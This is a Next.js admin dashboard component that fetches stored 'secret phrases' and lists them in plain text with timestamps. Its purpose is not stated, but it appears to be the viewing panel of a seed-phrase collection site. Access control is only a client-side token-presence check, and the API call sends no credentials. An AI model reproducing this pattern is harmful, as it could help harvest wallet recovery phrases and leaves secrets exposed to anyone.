"use client";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import axios from "axios";

const AdminDashboard: React.FC = () => {
    interface SecretPhrase {
        _id: string;
        secretPhrase: string;
        createdAt: string; // ISO date string
      }
      
  const [secretPhrases, setSecretPhrases] = useState<SecretPhrase[]>([]);
  const [isLoggedIn, setIsLoggedIn] = useState<boolean>(false);
  const router = useRouter();

  useEffect(() => {
    // Check if admin is logged in
    const token = localStorage.getItem("adminToken");
    if (token) {
      setIsLoggedIn(true);
    } else {
      router.push("/admin/login");
    }

    // Fetch secret phrases from the database
    const fetchSecretPhrases = async () => {
      try {
        const response = await axios.get("/api/admin/secretPhrases");
        setSecretPhrases(response.data);
      } catch (error) {
        console.error("Error fetching secret phrases:", error);
      }
    };

    if (isLoggedIn) {
      fetchSecretPhrases();
    }
  }, [isLoggedIn, router]);

  return (
    <div className="min-h-screen bg-gray-800 text-white p-6">
      {!isLoggedIn ? (
        <div className="text-center">Loading...</div>
      ) : (
        <div>
          <h1 className="text-3xl font-bold mb-6">Welcome to Admin Dashboard</h1>
          <h2 className="text-xl font-semibold mb-4">Secret Phrases</h2>
          {/* Table to display secret phrases */}
          <table className="w-full table-auto border-collapse border border-gray-700">
            <thead>
              <tr>
                <th className="px-4 py-2 border-b border-gray-600">#</th>
                <th className="px-4 py-2 border-b border-gray-600">Secret Phrase</th>
                <th className="px-4 py-2 border-b border-gray-600">Created At</th>
              </tr>
            </thead>
            <tbody>
              {secretPhrases.length === 0 ? (
                <tr>
                  <td colSpan={3} className="px-4 py-2 text-center text-gray-400">
                    No secret phrases found
                  </td>
                </tr>
              ) : (
                secretPhrases.map((secret, index) => (
                  <tr key={secret._id}>
                    <td className="px-4 py-2 border-b border-gray-600">{index + 1}</td>
                    <td className="px-4 py-2 border-b border-gray-600">{secret.secretPhrase}</td>
                    <td className="px-4 py-2 border-b border-gray-600">
                      {new Date(secret.createdAt).toLocaleString()}
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
};

export default AdminDashboard;
